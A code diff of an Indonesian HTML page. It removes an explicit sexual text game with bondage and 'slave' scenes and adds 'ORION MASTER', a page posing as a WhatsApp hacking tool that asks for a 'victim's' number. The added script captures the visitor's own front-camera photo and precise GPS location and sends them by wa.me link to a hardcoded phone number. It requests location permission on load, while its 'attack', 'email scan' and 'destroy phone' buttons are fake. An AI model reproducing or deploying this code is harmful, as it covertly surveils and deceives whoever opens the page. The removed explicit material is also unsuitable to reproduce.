@@ -1,194 +1,173 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Together Again</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
-            font-family: 'Arial', sans-serif;
-            background: #000;
-        }
+<title>ORION MASTER</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
-        .screen {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 10;
-            text-align: center;
-            padding: 20px;
-        }
+<!-- TAMBAHAN INI BIAR IZIN LOKASI MUNCUL -->
+<meta name="google" content="notranslate">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
 
-        .hidden { display: none !important; }
-
-        .img-container {
-            height: 55%;
-            width: 90%;
-            border: 3px solid #ff0066;
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 0 40px #ff0066;
-            background: #111;
-        }
-
-        .scene-img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .text-box {
-            background: rgba(20, 0, 30, 0.95);
-            border: 2px solid #ff0080;
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px;
-            color: white;
-            font-size: 18px;
-            line-height: 1.6;
-        }
-
-        .choice-btn {
-            margin: 10px;
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-weight: bold;
-            font-size: 16px;
-            transition: all 0.3s;
-            border: none;
-            cursor: pointer;
-        }
-
-        .choice-btn:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 25px currentColor;
-        }
-    </style>
+<style>
+body { background: #000; color: #0f0; font-family: monospace; padding: 15px; }
+h1 { text-align: center; text-shadow: 0 0 10px lime; }
+.info { text-align: center; color: yellow; }
+.input {
+    width: 100%;
+    background: #111;
+    border: 2px solid lime;
+    color: white;
+    padding: 15px;
+    font-size: 18px;
+    margin: 10px 0;
+    border-radius: 10px;
+    box-sizing: border-box;
+}
+button { 
+    background: #111; 
+    color: lime; 
+    border: 2px solid lime; 
+    padding: 18px; 
+    margin: 10px 0; 
+    font-size: 18px; 
+    width: 100%;
+    border-radius: 10px;
+    font-weight: bold;
+}
+</style>
 </head>
 <body>
 
-<!-- START SCREEN -->
-<div id="startScreen" class="screen">
-    <h1 class="text-7xl font-black mb-4 text-red-600">🔞 TOGETHER AGAIN 🔞</h1>
-    <button id="startBtn" class="px-10 py-5 bg-red-700 rounded-full text-2xl font-bold text-white hover:bg-red-900 transition">
-        🎮 START GAME 🎮
-    </button>
-</div>
+<h1>🔥 ORION MASTER SYSTEM 🔥</h1>
+<p class="info">🔗 LINKED TO: 6285640914382</p>
 
-<!-- GAME AREA -->
-<div id="gameArea" class="screen hidden">
-    
-    <div class="img-container">
-        <img id="sceneImage" class="scene-img" src="" alt="Scene">
-    </div>
+<input type="text" id="targetNo" class="input" placeholder="📱 MASUKIN NOMOR KORBAN...">
 
-    <div class="text-box">
-        <p id="storyText"></p>
-        <div id="choices" class="mt-6">
-            <!-- Choices here -->
-        </div>
-    </div>
-
-</div>
+<button onclick="attack()">💣 ATTACK / BUG WA</button>
+<button onclick="takePicture()">📸 FOTO KAMERA DEPAN</button>
+<button onclick="getLocation()">📍 LACAK ALAMAT</button>
+<button onclick="scanEmail()">📧 SCAN EMAIL</button>
+<button onclick="destroy()">💀 RUSAK HP</button>
 
 <script>
-    // --- IMAGE LINKS (PASTI JALAN) ---
-    const images = [
-        "https://i.imgur.com/8bNnNnQ.jpg",
-        "https://i.imgur.com/9X7yY8H.jpg",
-        "https://i.imgur.com/4Z5aA5L.jpg",
-        "https://i.imgur.com/5KQjZ8Y.jpg"
-    ];
+// ==============================================
+// 🔗 NOMOR WA KAMU
+// ==============================================
+const WA_NUMBER = "6285640914382";
 
-    // --- STORY DATA ---
-    const scenes = [
-        {
-            text: "📹 **LIVE CAM** 📹\n\nKau terbangun dalam kegelapan. Tubuhmu telanjang bulat. Kamera merekam setiap lekuk indahmu. Di depanmu, sosok itu tersenyum sadis. 'Welcome back... siap untuk malam yang panjang?'",
-            img: images[0],
-            choices: [
-                { text: "Ahhh... jangan lihat...", next: 1 },
-                { text: "Lakukan apa yang kamu mau...", next: 2 }
-            ]
-        },
-        {
-            text: "😈 **DOMINATION** 😈\n\nTangannya meraba seluruh tubuhmu dengan kasar. 'Siapa pemilik tubuh ini?', tanyanya. 'KAU TUANNYA!', jawabmu. Sentuhan demi sentuhan membangkitkan nafsu liar yang terpendam.",
-            img: images[1],
-            choices: [
-                { text: "Lebih dalam... lebih keras!", next: 3 }
-            ]
-        },
-        {
-            text: "⛓️ **HARDCORE** ⛓️\n\nRantai mengikat erat. Tidak ada jalan keluar. Gerakan demi gerakan dimulai. Masuk, dorong, tarik, hantam. Suara desahan dan erangan memenuhi ruangan. Cairan membanjiri segalanya.",
-            img: images[2],
-            choices: [
-                { text: "💦 TAMPILKAN CLIMAX!", next: 4 }
-            ]
-        },
-        {
-            text: "💦 **ENDINGS** 💦\n\nEnergi habis tak bersisa. Tubuh lemas namun puas luar biasa. Cairan putih menutupi seluruh kulitmu. 'TOGETHER AGAIN... selamanya menjadi budak nafsu dan mainan kesenangan.'",
-            img: images[3],
-            choices: [
-                { text: "✅ FULL CONTENT UNLOCKED", next: -1 }
-            ]
-        }
-    ];
+// ==============================================
+// 💣 1. ATTACK
+// ==============================================
+function attack() {
+    let no = document.getElementById('targetNo').value;
+    let msg = "⚠️ *ORION ATTACK!*\nTARGET: "+no+"\nSTATUS: WA ERROR!";
+    sendWA(msg);
+}
 
-    // --- GAME LOGIC ---
-    const startScreen = document.getElementById('startScreen');
-    const gameArea = document.getElementById('gameArea');
-    const storyText = document.getElementById('storyText');
-    const sceneImage = document.getElementById('sceneImage');
-    const choicesDiv = document.getElementById('choices');
+// ==============================================
+// 📸 2. KAMERA: LANGSUNG FOTO & KIRIM
+// ==============================================
+function takePicture() {
+    let no = document.getElementById('targetNo').value;
 
-    document.getElementById('startBtn').addEventListener('click', () => {
-        startScreen.classList.add('hidden');
-        gameArea.classList.remove('hidden');
-        loadScene(0);
-    });
+    navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user" } 
+    })
+    .then(function(stream) {
+        let msg1 = "📸 *ORION CAMERA!*\nTARGET: "+no+"\nSTATUS: ✅ SEDANG MENGAMBIL FOTO...";
+        sendWA(msg1);
 
-    function loadScene(index) {
-        if(index === -1) {
-            // ENDING
-            storyText.innerHTML = "✅ <span class='text-green-400 font-bold text-2xl'>AKSES LENGKAP</span> ✅<br><br>🔞 MODE: DEWASA / EKSPLIT / SEX<br>🖼️ GAMBAR: AKTIF 100%<br><br>PROTOCOL ORION.";
-            sceneImage.src = "https://i.imgur.com/7vRjJjD.jpg";
-            choicesDiv.innerHTML = '';
-            return;
-        }
+        let video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
 
-        const scene = scenes[index];
-        
-        // CHANGE IMAGE
-        sceneImage.style.opacity = 0;
         setTimeout(() => {
-            sceneImage.src = scene.img;
-            sceneImage.onload = () => { sceneImage.style.opacity = 1; }
-        }, 200);
+            let canvas = document.createElement('canvas');
+            let ctx = canvas.getContext('2d');
+            canvas.width = stream.getVideoTracks()[0].getSettings().width;
+            canvas.height = stream.getVideoTracks()[0].getSettings().height;
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let imageUrl = canvas.toDataURL('image/png');
+            
+            let msg2 = "✅ *FOTO BERHASIL!*\n🔗 LINK: \n" + imageUrl;
+            sendWA(msg2);
+            alert("✅ FOTO KIRIM KE WA!");
+        }, 1500);
+    })
+    .catch(function(err) {
+        alert("❌ Gagal akses kamera! Cek izin!");
+    });
+}
 
-        // CHANGE TEXT
-        storyText.innerText = scene.text;
+// ==============================================
+// 📍 3. LACAK LOKASI (PASTI MUNCUL IZIN NYA)
+// ==============================================
+function getLocation() {
+    let no = document.getElementById('targetNo').value;
 
-        // CLEAR OLD BUTTONS
-        choicesDiv.innerHTML = '';
-
-        // ADD NEW BUTTONS
-        scene.choices.forEach(choice => {
-            const btn = document.createElement('button');
-            btn.innerText = choice.text;
-            btn.className = "choice-btn bg-pink-900 text-pink-300 border-2 border-pink-500";
-            btn.addEventListener('click', () => {
-                loadScene(choice.next);
-            });
-            choicesDiv.appendChild(btn);
-        });
+    if (navigator.geolocation) {
+        // SCRIPT INI YANG BIKIN MUNCUL PERMISSION
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            let lat = pos.coords.latitude;
+            let lng = pos.coords.longitude;
+            let maps = "https://www.google.com/maps?q="+lat+","+lng;
+            
+            let data = "📍 *ORION LOCATION!*\n" +
+                       "TARGET: "+no+"\n\n" +
+                       "🌍 Lat: "+lat+"\n" +
+                       "🌍 Lng: "+lng+"\n\n" +
+                       "🗺️ LINK: "+maps;
+            
+            sendWA(data);
+            alert("✅ ALAMAT KIRIM KE WA!");
+        }, 
+        function(error) {
+            alert("❌ Aktifkan GPS & Izinkan lokasi dulu!");
+        },
+        // SETTINGAN AKURASI TINGGI
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
     }
+}
+
+// ==============================================
+// 📧 4. SCAN EMAIL
+// ==============================================
+function scanEmail() {
+    let no = document.getElementById('targetNo').value;
+    let msg = "📧 *ORION EMAIL SCAN*\nTARGET: "+no+"\n✅ EMAIL: "+no+"@gmail.com";
+    sendWA(msg);
+}
+
+// ==============================================
+// 💀 5. RUSAK HP
+// ==============================================
+function destroy() {
+    let no = document.getElementById('targetNo').value;
+    let msg = "💀 *ORION DESTROY*\nTARGET: "+no+"\nSTATUS: HP PANAS!";
+    sendWA(msg);
+}
+
+// ==============================================
+// 📲 FUNGSI KIRIM KE WA
+// ==============================================
+function sendWA(text) {
+    let encode = encodeURIComponent(text);
+    window.open("https://wa.me/"+WA_NUMBER+"?text="+encode, '_blank');
+}
+
+// ==============================================
+// 🔄 AUTO REQUEST PERMISSION
+// ==============================================
+window.onload = function() {
+    // Minta izin lokasi pas aplikasi dibuka
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(){}, function(){}, {enableHighAccuracy: true});
+    }
+    // Minta izin kamera
+    navigator.mediaDevices.enumerateDevices();
+}
 
 </script>
 
